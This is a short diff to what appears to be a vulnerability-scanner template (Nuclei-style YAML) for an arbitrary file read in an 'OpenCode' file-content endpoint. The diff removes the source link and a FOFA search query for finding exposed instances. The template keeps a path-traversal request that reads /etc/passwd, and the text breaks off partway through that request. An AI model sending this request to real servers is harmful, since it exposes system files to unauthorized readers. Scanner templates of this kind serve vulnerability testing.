@@ -3,12 +3,8 @@ info:
   name: OpenCode content 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fm7338cr3gbhq9nr'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fm7338cr3gbhq9nr
-    fofa: title="opencode"
 http:
 - raw:
   - 'GET /file/content?path=../../../../etc/passwd HTTP/1.1
